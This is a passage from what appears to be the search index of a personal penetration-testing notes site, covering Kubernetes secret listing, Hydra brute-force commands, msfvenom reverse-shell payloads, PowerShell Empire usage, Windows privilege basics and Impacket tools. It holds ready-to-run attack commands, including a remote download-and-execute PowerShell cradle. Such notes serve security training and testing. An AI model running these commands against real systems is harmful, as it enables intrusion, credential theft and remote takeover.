to communicate with the <code>kube-apiserver</code>.</p>"},{"location":"Cheatsheets/General/Kubernetes_Pentesting/#connecting-and-using-a-k8s-cluster","title":"Connecting and Using a k8s Cluster","text":"<p>There are three stages that a user or service account must go through to connect to the cluster in order to receive or carry out instructions:</p> <ul> <li>Authentication</li> <li>Authorization</li> <li>Admission Control</li> </ul> <p>This loop is performed whenever an account sends a request to the <code>kube_apiserver</code>, the request could be something as simple as \"list all pods\" or something a bit more restricted such as creating a new service account.</p>"},{"location":"Cheatsheets/General/Kubernetes_Pentesting/#authentication","title":"Authentication","text":"<p>This is usually done with either a certificate, a token or using Basic Authentication (i.e. username &amp; password), there are also ways that it can be configured to be used with things like LDAP, but that's just an abstraction of the authentication process.</p>"},{"location":"Cheatsheets/General/Kubernetes_Pentesting/#authorization","title":"Authorization","text":"<p>Once the users token, certificate, or username and password combination has been verified by the cluster k8s then checks that user or service accounts permissions to see if they are allowed to perform the requested action (i.e. download a new image)</p>"},{"location":"Cheatsheets/General/Kubernetes_Pentesting/#admission-control","title":"Admission Control","text":"<p>These are pieces of software that are able to acccess the content that is being requested by the users or service accounts, there are lots of these \"Admission Controllers\":</p> <p>k8s Docs on Admission Controllers</p>"},{"location":"Cheatsheets/General/Kubernetes_Pentesting/#rbac-role-based-access-control","title":"RBAC (Role Based Access Control)","text":"<p>The RBAC uses specific \u201cresources\u201d and \u201cverbs\u201d to grant access:</p> <ul> <li>Resources are the information that can be accessed (e.g., information about pods, read secrets, etc.\u2019).</li> <li>Verbs are how the resources can be accessed (e.g., list secrets, get pods, watch, etc.\u2019).</li> </ul>"},{"location":"Cheatsheets/General/Kubernetes_Pentesting/#tools","title":"Tools","text":"<ul> <li>KubiScan</li> <li>RBAC-Audit</li> </ul>"},{"location":"Cheatsheets/General/Kubernetes_Pentesting/#attack-methods","title":"Attack Methods","text":"<ul> <li>Listing Secrets</li> </ul> <p>An attacker that gains access to list secrets in the cluster can use the following curl commands to get all secrets in \u201ckube-system\u201d namespace:</p> <pre><code>curl -v -H \u201cAuthorization: Bearer &lt;jwt_token&gt;\u201d https://&lt;master_ip&gt;:&lt;port&gt;/api/v1/namespaces/kube-system/secrets/\n</code></pre> <ul> <li>Access Any Resource or Verb</li> </ul> <p>If you have access to see the RBAC config file then you can check to see the privileges for the cluster:</p> <ul> <li>Access Any Resource</li> <li>Pod Creation</li> <li>Create/Update Deployment, Daemonsets, Statefulsets, Replicationcontrollers, Replicasets, Jobs and Cronjobs</li> <li>Privilege to Use Pods/Exec</li> <li>Privilege to Get/Patch Rolebindings</li> <li>Impersonating a Privileged Account</li> </ul> <p>We're now looking at the TypeScript to see if we can find an XSS because the application is using websockets to speak back to the pods, so if we can find an XSS then we can send a proper request to the pods and potentially get RCE or information leakage</p>"},{"location":"Cheatsheets/General/cheatsheet_js/","title":"Commands","text":"Command Description <code>curl http:/SERVER_IP:PORT/</code> cURL GET request <code>curl -s http:/SERVER_IP:PORT/ -X POST</code> cURL POST request <code>curl -s http:/SERVER_IP:PORT/ -X POST -d \"param1=sample\"</code> cURL POST request with data <code>alias curlx=\"curl -x http://127.0.0.1:8080 \"</code> proxy a cURL request through Burp <code>echo bullsec \\| base64</code> base64 encode <code>echo ENCODED_B64 \\| base64 -d</code> base64 decode <code>echo bullsec \\| xxd -p</code> hex encode <code>echo ENCODED_HEX \\| xxd -p -r</code> hex decode <code>echo bullsec \\| tr 'A-Za-z' 'N-ZA-Mn-za-m'</code> rot13 encode <code>echo ENCODED_ROT13 \\| tr 'A-Za-z' 'N-ZA-Mn-za-m'</code> rot13 decode"},{"location":"Cheatsheets/General/cheatsheet_js/#deobfuscation-websites","title":"Deobfuscation Websites","text":"Website JS Console Prettier Beautifier JSNice"},{"location":"Cheatsheets/General/cheatsheet_js/#misc","title":"Misc","text":"Command Description <code>ctrl+u</code> Show HTML source code in Firefox"},{"location":"Cheatsheets/General/hydra_cheat_sheet/","title":"Hydra Cheat Sheet","text":"Command Description hydra -P password-file.txt -v $ip snmp Hydra brute force against SNMP hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp Hydra FTP known user and rockyou password list hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh Hydra SSH using list of users and passwords hydra -v -V -u -L users.txt -p \"\" -t 1 -u $ip ssh Hydra SSH using a known password and a username list hydra $ip -s 22 ssh -l -P big_wordlist.txt Hydra SSH Against Known username on port 22 hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V Hydra POP3 Brute Force hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V Hydra SMTP Bruteforce hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin Hydra attack http get 401 login with a dictionary hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip Hydra attack Windows Remote Desktop with rockyou hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb Hydra brute force SMB user with rockyou hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location' Hydra brute force a Wordpress admin login hydra -L usernames.txt -P passwords.txt $ip smb -V -f SMB Brute Forcing hydra -L users.txt -P passwords.txt $ip ldap2 -V -f LDAP Brute Forcing"},{"location":"Cheatsheets/General/msfvenom_cheatsheet/","title":"MSFVenom Cheatsheet","text":"MSFVenom Payload Generation One-Liner Description msfvenom -l   payloads List available payloads msfvenom -p PAYLOAD --list-options List payload options msfvenom -p   PAYLOAD -e ENCODER -f FORMAT -i ENCODE COUNT   LHOST=IP Payload Encoding msfvenom -p   linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf  &gt;  shell.elf Linux Meterpreter  reverse shell x86 multi stage msfvenom -p   linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf  &gt;  shell.elf Linux Meterpreter  bind shell x86 multi stage msfvenom -p linux/x64/shell_bind_tcp   RHOST=IP LPORT=PORT -f elf &gt; shell.elf Linux bind shell x64 single stage msfvenom -p linux/x64/shell_reverse_tcp   RHOST=IP LPORT=PORT -f elf &gt; shell.elf Linux reverse shell x64 single stage msfvenom -p   windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe &gt;   shell.exe Windows Meterpreter reverse shell msfvenom -p   windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent=\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36\" -f exe &gt; shell.exe Windows Meterpreter http reverse shell msfvenom -p   windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe &gt;   shell.exe Windows Meterpreter bind shell msfvenom -p   windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe &gt;   shell.exe Windows CMD Multi Stage msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT   -f exe &gt;  shell.exe Windows CMD Single Stage msfvenom -p   windows/adduser USER=hacker PASS=password -f exe &gt; useradd.exe Windows add user msfvenom -p   osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho &gt;   shell.macho Mac Reverse Shell msfvenom -p   osx/x86/shell_bind_tcp RHOST=IP LPORT=PORT -f macho  &gt;  shell.macho Mac Bind shell msfvenom -p   cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw &gt;   shell.py Python Shell msfvenom -p   cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw &gt;   shell.sh BASH Shell msfvenom -p   cmd/unix/reverse_perl LHOST=IP LPORT=PORT -f raw &gt;   shell.pl PERL Shell msfvenom -p   windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp &gt;   shell.asp ASP Meterpreter shell msfvenom -p   java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw  &gt;  shell.jsp JSP Shell msfvenom -p   java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war &gt;   shell.war WAR Shell msfvenom -p   php/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f raw  &gt;  shell.php   cat shell.php pbcopy &amp;&amp; echo '?php ' msfvenom -p   php/reverse_php LHOST=IP LPORT=PORT -f raw  &gt;  phpreverseshell.php Php Reverse Shell msfvenom -a x86   --platform Windows -p windows/exec CMD=\"powershell \\\"IEX(New-Object   Net.webClient).downloadString('http://IP/nishang.ps1')\\\"\"   -f python Windows Exec Nishang Powershell in   python msfvenom -p   windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT   -f c -e x86/shikata_ga_nai -b \"\\x04\\xA0\" Bad characters shikata_ga_nai msfvenom -p   windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT   -f c -e x86/fnstenv_mov -b \"\\x04\\xA0\" Bad characters fnstenv_mov"},{"location":"Cheatsheets/General/msfvenom_cheatsheet/#multihandler-listener","title":"Multihandler Listener","text":"<p>To get multiple session on a single multi/handler, you need to set the ExitOnSession option to false and run the exploit -j instead of just the exploit. For example, for meterpreter/reverse_tcp payload,  </p> <pre><code>msf&gt;use exploit/multi/handler  \nmsf&gt;set payload windows/meterpreter/reverse_tcp  \nmsf&gt;set lhost &lt;IP&gt;  \nmsf&gt;set lport &lt;PORT&gt;  \nmsf&gt; set ExitOnSession false  \nmsf&gt;exploit -j  \n</code></pre> <p>The -j option is to keep all the connected session in the background.  </p>"},{"location":"Cheatsheets/General/msfvenom_cheatsheet/#references","title":"References","text":""},{"location":"Cheatsheets/General/splunk_cheat_sheet/","title":"Splunk Cheatsheet","text":""},{"location":"Cheatsheets/General/splunk_cheat_sheet/#basics","title":"Basics","text":"<ul> <li><code>index=*</code> - Show data from all indices</li> <li><code>index=\"name_of_index\"</code> - Show data from specific index</li> </ul>"},{"location":"Cheatsheets/General/splunk_cheat_sheet/#operators","title":"Operators","text":"<pre><code>\"fish\" AND  \"chips\" \n\"fish\" or  \"chips\"\n</code></pre>"},{"location":"Cheatsheets/General/splunk_cheat_sheet/#sorting","title":"Sorting","text":"<ul> <li><code>* | sort ip, -url</code> - Sort results by ip value in ascending order and then by url value in descending order</li> <li><code>* | reverse</code> - Reverse the order of a result set</li> <li><code>* | head 20</code> - Return the first 20 results</li> <li><code>* | tail 20</code> - Return the last 20 results (in reverse order)</li> </ul> <p>Splunk Official Wiki Cheatsheet</p>"},{"location":"Cheatsheets/Linux/2022-07-30-x-without-y/","title":"X Without Y (Living off the Land)","text":"<p>Inspired by Staaldraad's Post on the Matter</p> <p>Run into situations like this quite often when testing container based systems so thought it was worth starting to compile them all into one document for reference purposes.</p>"},{"location":"Cheatsheets/Linux/2022-07-30-x-without-y/#arp-without-arp","title":"ARP without ARP","text":"<pre><code>cat /proc/net/arp\nip neigh\n</code></pre>"},{"location":"Cheatsheets/Linux/2022-07-30-x-without-y/#netstat-without-netstat","title":"Netstat without Netstat","text":"<p>Staaldraad's AWK script:</p> <pre><code>awk'function hextodec(str,ret,n,i,k,c){\n    ret = 0\n    n = length(str)\n    for (i = 1; i &lt;= n; i++) {\n        c = tolower(substr(str, i, 1))\n        k = index(\"123456789abcdef\", c)\n        ret = ret * 16 + k\n    }\n    return ret\n}\nfunction getIP(str,ret){\n    ret=hextodec(substr(str,index(str,\":\")-2,2)); \n    for (i=5; i&gt;0; i-=2) {\n        ret = ret\".\"hextodec(substr(str,i,2))\n    }\n    ret = ret\":\"hextodec(substr(str,index(str,\":\")+1,4))\n    return ret\n}\nNR &gt; 1 \\{\\{if(NR==2)print \"Local - Remote\";local=getIP($2);remote=getIP($3)}{print local\" - \"remote}}' /proc/net/tcp\n</code></pre> <p>Remove the backslashes before the if statement after <code>NR &gt; 1</code> to get it to work.</p> <p>The above presumes <code>awk</code> is installed, if it's not you're SOL.</p>"},{"location":"Cheatsheets/Linux/2022-07-30-x-without-y/#ping-without-ping","title":"Ping without Ping","text":"<p>Two cases for this.</p> <ul> <li>1) We don't have <code>ping</code></li> <li>2) We do have ping but ICMP is blocked</li> </ul> <p>We can't get around Case #2 but we can get around Case #1.</p> <pre><code>telnet ip.ad.dre.ss 80\nnc -znv ip.ad.dre.ss port\n</code></pre>"},{"location":"Cheatsheets/Linux/2022-07-30-x-without-y/#ls-without-ls","title":"ls without ls","text":"<pre><code>echo *\necho */*\nfor i in *; do echo $i; done\n</code></pre>"},{"location":"Cheatsheets/Linux/Powershell_Empire/","title":"Powershell Empire","text":"<p>Started using this today, it's really cool. Takes a lot of the work out of finding scripts to run.</p> <p>Firing it up:</p> <pre><code>/data/reset.sh\n</code></pre> <p>Run it with that to reset the database, otherwise it  seems to fail to start, not always though so if you just need to start  it (and it doesn't crash) then do:</p> <pre><code>./empire\n</code></pre> <p>Setup a Listener</p> <pre><code>listeners\n</code></pre> <p>Once you're inside that menu do:</p> <pre><code>uselistener &lt;tab-completion-works-here&gt;\n</code></pre> <p>View options with:</p> <pre><code>info\n</code></pre> <p>Then use set to configure the connection for your IP/Port:</p> <pre><code>set Host 10.10.14.3:443\nset Port 443\n</code></pre> <p>For the shell to come back the ports need to match (or so it appears)</p> <p>To start the listener:</p> <pre><code>execute\n</code></pre> <p>Then run:</p> <pre><code>launcher powershell\n</code></pre> <p>This will fire back the other half of the shell, which you can execute with IEX(New-Object Net.WebClient)downloadString('http://yoursever/yourfile.ps1')</p> <p>Interacting with Agents Head back to the main menu using back Now type agents to see a list of active agents. Get the name of the agent you wish to interact with, and type:</p> <pre><code>interact &lt;agent-name&gt;\n(Empire) &gt; interact ASWX9H8G\n(Empire: ASWX9H8G) &gt;\n</code></pre> <p>Now you can type:</p> <pre><code>searchmodule &lt;modulename (not case sensitive)\n</code></pre> <p>Using Modules Once you've found the module you're looking for run:</p> <pre><code>usemodule &lt;module-name&gt;\n</code></pre> <p>Then type info and hit enter to see the options:</p> <pre><code>(Empire: ASWX9H8G) &gt; usemodule privesc/powerup/allchecks\n(Empire: powershell/privesc/powerup/allchecks) &gt; info\n\n              Name: Invoke-AllChecks\n            Module: powershell/privesc/powerup/allchecks\n        NeedsAdmin: False\n         OpsecSafe: True\n          Language: powershell\nMinLanguageVersion: 2\n        Background: True\n   OutputExtension: None\n\nAuthors:\n  @harmj0y\n\nDescription:\n  Runs all current checks for Windows privesc vectors.\n\nComments:\n  https://github.com/PowerShellEmpire/PowerTools/tree/master/P\n  owerUp\n\nOptions:\n\n  Name  Required    Value                     Description\n  ----  --------    -------                   -----------\n  Agent True        ASWX9H8G                  Agent to run module on.\n\n</code></pre> <p>In this case we can just type execute and then hit enter</p> <pre><code>(Empire: powershell/privesc/powerup/allchecks) &gt; execute\n[*] Tasked ASWX9H8G to run TASK_CMD_JOB\n[*] Agent ASWX9H8G tasked with task ID 4\n[*] Tasked agent ASWX9H8G to run module powershell/privesc/powerup/allchecks\n(Empire: powershell/privesc/powerup/allchecks) &gt; [*] Agent ASWX9H8G returned results.\nJob started: F9E4KY\n[*] Valid results returned by 10.10.10.81\nWait a few seconds. And that should output what it managed to find. \n</code></pre>"},{"location":"Cheatsheets/Linux/Powershell_Empire/#credentials","title":"Credentials","text":"<p>creds add domain username password</p> <p>Use creds to see all stored credentials.</p> <p>For some modules you can then just use set CredID <code>&lt;ID number&gt;</code> and not have to type in the username and password.</p> <p>Getting Trolled By CredTypes If you see:</p> <p>[!] A CredID with a plaintext password must be used!</p> <p>Then check creds.</p> <p>If the password is the wrong type, readd it with the following:</p> <p>creds add DESKTOP-7I3S68E Administrator 3130438f31186fbaf962f407711faddb something plaintext</p> <p>Then just use the new ID and you gucci</p>"},{"location":"Cheatsheets/Linux/linux/","title":"Linux 101","text":"<pre><code>#!/bin/bash\n\nmy_variable=$1\n\necho $1\n</code></pre> <p>This is a test to see if the pipelines are still working..</p> <p>(doesn't look like they are)</p> <p>Maybe it's fixed now?</p>"},{"location":"Cheatsheets/Windows/101_windows/","title":"Windows Privilege Escalation 101","text":""},{"location":"Cheatsheets/Windows/101_windows/#user-accounts","title":"User Accounts","text":"<p>These are the basic account(s) that you would use to log into a Windows machine.</p> <p>They are a collection of settings/preferences bound to a unique identity. i.e. the username and the files linked to that account along with other preferences such as installed applications and group membership(s), all the various things that could be associated with a user account.</p> <p>The local \"Administrator\" account is created by default during the installation process. It is not directly available to log in, similar to the <code>root</code> account on modern Linux systems, with the difference being that it can be activated using <code>net user administrator /active:yes</code> and it will become an account that appears on the login screen.</p> <p>Depending on the version of Windows that is running there may be several other default User accounts such as \"Guest\".</p>"},{"location":"Cheatsheets/Windows/101_windows/#service-accounts","title":"Service Accounts","text":"<p>Used to run services (duh), services are programs that are being ran either constantly (in the case of web servers and FTP applications) or on a scheduled basis by a dedicated account with permissions set up specifically for that account. So in the case of the <code>NT AUTHORITY\\IUSR</code> account which is used to control the IIS web service, it has specific permissions which allow it to manage the web server and all of it's associated functions. </p> <p>They cannot be used to log in to Windows directly. But they are capable of granting a \"user\" shell, which will allow for access to the system but with generally limited capabilites and permissions.</p> <p>The <code>NT AUTHORITY\\SYSTEM</code> account is a default service account created during installation which has the highest privileges of any local account on Windows. It is the Windows equivalent of the \"root\" account and has full control over any application or user account on the system. In some instances it will even be a trusted account on other machines in the same network allowing for lateral movement.</p> <p>There are other default service accounts that are created during the installation process, such as NETWORK SERVICE and LOCAL SERVICE, and the aforementioned IUSR.</p>"},{"location":"Cheatsheets/Windows/101_windows/#groups","title":"Groups","text":"<p>User accounts can belong to multiple groups, and groups can have multiple users (same as Linux). Not much else to explain here, just bear in mind that there are LOTS of groups on Windows systems, and especially when it comes to AD/Domain controllers you're going to have to get your reference sheets out and run things like <code>BloodHound</code> to map all of the interactions between the groups.</p> <p>Groups allow for easier access control configuration by allowing multiple users the same level of access to a resource. We could created a group called \"Tech_Admins\" and give them access to restart/modify specific services and applications to allow them to perform maintenance or upgrades. </p> <p>There are two types of groups:</p>"},{"location":"Cheatsheets/Windows/101_windows/#regular-groups","title":"Regular Groups","text":"<p>These groups have a set list of members and are created by the domain or system Administrator(s), with the exception of the default groups such as \"Users\" which contain ALL regular (non-service) users of a system.</p>"},{"location":"Cheatsheets/Windows/101_windows/#psuedo-groups","title":"Psuedo Groups","text":"<p>These groups have a dynamic list of users that can change based on certain interactions, i.e. the \"Authenticated Users\" group contains a list of members who are CURRENTLY authenticated to the system.</p>"},{"location":"Cheatsheets/Windows/101_windows/#resources","title":"Resources","text":"<p>Windows has a concept of resources known as Objects, there are multiple types of these:</p> <ul> <li>Files/Directories</li> <li>Registry Entries</li> <li>Services</li> </ul> <p>Everything is treated as an object and every object has a set of permissions attached to it. In most cases these are inherited from the parent directory but it is not allways the case and can lead to vulnerabilities we can take advantage of, and sometimes the inheritence itself is the thing we will look to take advantage of.</p> <p>Whether a user has permission to perform certain actions on a resource will depend on what Groups that User is a member of and what permissions the User has.</p> <pre><code>whoami          # computername\\username\nwhoami /logonid # Gets the SID for our user\nwhoami /priv    # Permissions\nwhoami /groups  # Group Membership\nwhoami /all     # All the above at once\n</code></pre>"},{"location":"Cheatsheets/Windows/101_windows/#acls-aces","title":"ACLs &amp; ACEs","text":"<p>Permissions to access resources (Objects) in Windows are controlled by the ACLs or Access Control Lists for that resource.</p> <p>Each ACL is made up of zero or more access control entries (ACEs)</p> <p>Each ACE define the relationship between a Principal (the name Windows uses for Users and Groups) and a certain access right.</p> <p>To view the ACL for a particular Object you can use the GUI to open the Advanced Security Settings menu, or you can run the following command in PowerShell:</p> <pre><code>Get-ACL &lt;file&gt;\n</code></pre> <pre><code>PS C:\\Users\\MrBullsec\\Documents&gt; Get-Acl .\\notes_checklist.md\n\n\n    Directory: C:\\Users\\MrBullsec\\Documents\n\n\nPath               Owner         Access\n----               -----         ------\nnotes_checklist.md CC1\\MrBullsec NT AUTHORITY\\SYSTEM Allow  FullControl...\n\n</code></pre> <p>or the following in CMD.exe:</p> <pre><code>icacls &lt;file&gt;\n</code></pre> <pre><code>PS C:\\Users\\MrBullsec\\Documents&gt; icacls .\\notes_checklist.md\n.\\notes_checklist.md NT AUTHORITY\\SYSTEM:(I)(F)\n                     BUILTIN\\Administrators:(I)(F)\n                     CC1\\MrBullsec:(I)(F)\n</code></pre>"},{"location":"Cheatsheets/Windows/2022-07-09-impacket/","title":"Impacket Toolset","text":"<p>Adapted from the Official Impacket Documentation</p> <p>Impacket is a whole collection of scripts and libraries written in Python :heart: that let you do some awesome things during a penetration test.</p> <p>The first part of this is a list of what I consider to be the most useful tools, and a brief description of how they can be used or how I've used them. The rest is from the official but I've made some formatting changes.</p>"},{"location":"Cheatsheets/Windows/2022-07-09-impacket/#standoutmost-useful-tools","title":"Standout/Most Useful Tools","text":"<ul> <li><code>smbserver.py</code> - Does what it says on the tin. Gives you a quick and dirty SMB server that you can use for file transfers or for getting a service or user to authenticate against.</li> <li><code>GetUserSPNs.py</code> - a.k.a Kerberoast. If you have a username/password combination for a user and Kerberos is open on the host then this is 100% worth a shot. If it's successful (i.e. there is Service Principal Name attached to account) the it'll return a <code>Service Ticket</code> which hopefully can be cracked a give you the password for whatever service account is attached.</li> <li>Any of the <code>Remote Execution</code> tools, but specifically <code>psexec.py</code> which is an awesome little tool for running remote commands on a target</li> <li><code>mimikatz.py</code> - mini RPC server for mimikatz which drops you into a shell on the target that lets you run mimikatz commands</li> </ul> <p>There are LOADS more though, <code>impacket</code> is a whole collection of scripts.</p> <p>Here's some additional resources.</p> <ul> <li> <p>https://tools.thehacker.recipes/impacket/examples/</p> </li> <li> <p>How to Build a Home Lab</p> </li> </ul> <p>Everything following this is from the official documentation aside from some formatting changes</p>"},{"location":"Cheatsheets/Windows/2022-07-09-impacket/#protocols","title":"Protocols","text":"<ul> <li>Ethernet, Linux \u201cCooked\u201d capture.</li> <li>IP, TCP, UDP, ICMP, IGMP, ARP.</li> <li>IPv4 and IPv6 Support.</li> <li>NMB and SMB1, SMB2 and SMB3 (high-level implementations).</li> <li>MSRPC version 5, over different transports: TCP, SMB/TCP, SMB/NetBIOS and HTTP.</li> <li>Plain, NTLM and Kerberos authentications, using password/hashes/tickets/keys.</li> <li>Portions/full implementation of the following MSRPC interfaces: EPM, DTYPES, LSAD, LSAT, NRPC, RRP, SAMR, SRVS, WKST, SCMR, DCOM, WMI</li> <li>Portions of TDS (MSSQL) and LDAP protocol implementations.</li> </ul>"},{"location":"Cheatsheets/Windows/2022-07-09-impacket/#tools","title":"Tools","text":""},{"location":"Cheatsheets/Windows/2022-07-09-impacket/#remote-execution","title":"Remote Execution","text":"<ul> <li><code>psexec.py</code>: PSEXEC like functionality example using RemComSvc (https://github.com/kavika13/RemCom).</li> <li><code>smbexec.py</code>: A similar approach to PSEXEC w/o using RemComSvc. The technique is described here. Our implementation goes one step further, instantiating a local smbserver to receive the output of the commands. This is useful in the situation where the target machine does NOT have a writeable share available.</li> <li><code>atexec.py</code>: This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.</li> <li><code>wmiexec.py</code>: A semi-interactive shell, used through Windows Management Instrumentation. It does not require to install any service/agent at the target server. Runs as Administrator. Highly stealthy.</li> <li><code>dcomexec.py</code>: A semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints. Currently supports MMC20.Application, ShellWindows and ShellBrowserWindow objects.</li> </ul>"},{"location":"Cheatsheets/Windows/2022-07-09-impacket/#kerberos","title":"Kerberos","text":"<ul> <li><code>GetTGT.py</code>: Given a password, hash or aesKey, this script will request a TGT and save it as ccache.</li> <li><code>GetST.py</code>: Given a password, hash, aesKey or TGT in ccache, this script will request a Service Ticket and save it as ccache. If the account has constrained delegation (with protocol transition) privileges you will be able to use the -impersonate switch to request the ticket on behalf another user.</li> <li><code>GetPac.py</code>: This script will get the PAC (Privilege Attribute Certificate) structure of the specified target user just having a normal authenticated user credentials. It does so by using a mix of [MS-SFU]\u2019s S4USelf + User to User Kerberos Authentication.</li> <li><code>GetUserSPNs.py</code>: This example will try to find and fetch Service Principal Names that are associated with normal user accounts. Output is compatible with JtR and HashCat.</li> <li><code>GetNPUsers.py</code>: This example will attempt to list and get TGTs for those users that have the property \u2018Do not require Kerberos preauthentication\u2019 set (UF_DONT_REQUIRE_PREAUTH). Output is compatible with JtR.</li> <li><code>rbcd.py</code>: Example script for handling the msDS-AllowedToActOnBehalfOfOtherIdentity property of a target computer.</li> <li><code>ticketConverter.py</code>: This script will convert kirbi files, commonly used by mimikatz, into ccache files used by Impacket, and vice versa.</li> <li><code>ticketer.py</code>: This script will create Golden/Silver tickets from scratch or based on a template (legally requested from the KDC) allowing you to customize some of the parameters set inside the PAC_LOGON_INFO structure, in particular the groups, ExtraSids, duration, etc.</li> <li><code>raiseChild.py</code>: This script implements a child-domain to forest privilege escalation by (ab)using the concept of Golden Tickets and ExtraSids. Windows Secrets</li> <li><code>secretsdump.py</code>: Performs various techniques to dump secrets from the remote machine without executing any agent there. For SAM and LSA Secrets (including cached creds) we try to read as much as we can from the registry and then we save the hives in the target system (%SYSTEMROOT%\\Temp directory) and read the rest of the data from there. For DIT files, we dump NTLM hashes, Plaintext credentials (if available) and Kerberos keys using the DL_DRSGetNCChanges() method. It can also dump NTDS.dit via vssadmin executed with the smbexec/wmiexec approach. The script initiates the services required for its working if they are not available (e.g. Remote Registry, even if it is disabled). After the work is done, things are restored to the original state.</li> <li><code>mimikatz.py</code>: Mini shell to control a remote mimikatz RPC server developed by @gentilkiwi.</li> </ul>"},{"location":"Cheatsheets/Windows/2022-07-09-impacket/#server-toolsmitm-attacks","title":"Server Tools/MiTM Attacks","text":"<ul> <li><code>ntlmrelayx.py</code>: This script performs NTLM Relay Attacks, setting an SMB, HTTP, WCF and RAW Server and relaying credentials to many different protocols (SMB, HTTP, MSSQL, LDAP, IMAP, POP3, etc.). The script can be used with predefined attacks that can be triggered when a connection is relayed (e.g. create a user through LDAP) or can be executed in SOCKS mode. In this mode, for every connection relayed, it will be available to be used later on multiple times through a SOCKS proxy.</li> <li><code>karmaSMB.py</code>: A SMB Server that answers specific file contents regardless of the SMB share and pathname specified.</li> <li><code>smbserver.py</code>: A Python implementation of an SMB server. Allows to quickly set up shares and user accounts.</li> </ul>"},{"location":"Cheatsheets/Windows/2022-07-09-impacket/#wmi","title":"WMI","text":"<ul> <li><code>wmiquery.py</code>: It allows to issue WQL queries and get description of WMI objects at the target system (e.g. select name from win32_account).</li> <li><code>wmipersist.py</code>: This script creates/removes a WMI Event Consumer/Filter and link between both to execute Visual Basic based on the WQL filter or timer specified.</li> </ul>"},{"location":"Cheatsheets/Windows/2022-07-09-impacket/#known-vulnerabilities","title":"Known Vulnerabilities","text":"<ul> <li><code>goldenPac.py</code>: Exploit for MS14-068. Saves the golden ticket and also launches a PSEXEC session at the target.</li> <li><code>sambaPipe.py</code>: This script will exploit CVE-2017-7494, uploading and executing the shared library specified by the user through the -so parameter.</li> <li><code>smbrelayx.py</code>: Exploit for CVE-2015-0005 using a SMB Relay Attack. If the target system is enforcing signing and a machine account was provided, the module will try to gather the SMB session key through NETLOGON.</li> </ul>"},{"location":"Cheatsheets/Windows/2022-07-09-impacket/#smbmsrpc","title":"SMB/MSRPC","text":"<ul> <li><code>smbclient.py</code>: A generic SMB client that will let you list shares and files, rename, upload and download files and create and delete directories, all using either username and password or username and hashes combination. It\u2019s an excellent example to see how to use impacket.smb in action.</li> <li><code>addcomputer.py</code>: Allows to add a computer to a domain using LDAP or SAMR (SMB). getArch.py: This script will connect against a target (or list of targets) machine/s and gather the OS architecture type installed by (ab)using a documented MSRPC feature.</li> <li><code>exchanger.py</code>: A tool for connecting to MS Exchange via RPC over HTTP v2.</li> <li><code>lookupsid.py</code>: A Windows SID brute forcer example through [MS-LSAT] MSRPC Interface, aiming at finding remote users/groups.</li> <li><code>netview.py</code>: Gets a list of the sessions opened at the remote hosts and keep track of them looping over the hosts found and keeping track of who logged in/out from remote servers</li> <li><code>reg.py</code>: Remote registry manipulation tool through the [MS-RRP] MSRPC Interface. The idea is to provide similar functionality as the REG.EXE Windows utility.</li> <li><code>rpcdump.py</code>: This script will dump the list of RPC endpoints and string bindings registered at the target. It will also try to match them with a list of well known endpoints.</li> <li><code>rpcmap.py</code>: Scan for listening DCE/RPC interfaces. This binds to the MGMT interface and gets a list of interface UUIDs. If the MGMT interface is not available, it takes a list of interface UUIDs seen in the wild and tries to bind to each interface.</li> <li><code>samrdump.py</code>: An application that communicates with the Security Account Manager Remote interface from the MSRPC suite. It lists system user accounts, available resource shares and other sensitive information exported through this service.</li> <li><code>services.py</code>: This script can be used to manipulate Windows services through the [MS-SCMR] MSRPC Interface. It supports start, stop, delete, status, config, list, create and change.</li> <li><code>smbpasswd.py</code>: This script is an alternative to smbpasswd tool and intended to be used for changing expired passwords remotely over SMB (MSRPC-SAMR) MSSQL / TDS</li> <li><code>mssqlinstance.py</code>: Retrieves the MSSQL instances names from the target host.</li> <li><code>mssqlclient.py</code>: An MSSQL client, supporting SQL and Windows Authentications (hashes too). It also supports TLS.</li> </ul>"},{"location":"Cheatsheets/Windows/2022-07-09-impacket/#file-formats","title":"File Formats","text":"<ul> <li><code>esentutl.py</code>: An Extensibe Storage Engine format implementation. Allows dumping catalog, pages and tables of ESE databases (e.g. NTDS.dit)</li> <li><code>ntfs-read.py</code>: NTFS format implementation. This script provides a mini shell for browsing and extracting an NTFS volume, including hidden/locked contents.</li> <li><code>registry-read.py</code>: A Windwows Registry file format implementation. It allows to parse offline registry hives.</li> </ul>"},{"location":"Cheatsheets/Windows/2022-07-09-impacket/#other","title":"Other","text":"<ul> <li><code>findDelegation.py</code>: Simple script to quickly list all delegation relationships (unconstrained, constrained, resource-based constrained) in an AD environment.</li> <li><code>GetADUsers.py</code>: This script will gather data about the domain\u2019s users and their corresponding email addresses. It will also include some extra information about last logon and last password set attributes.</li> 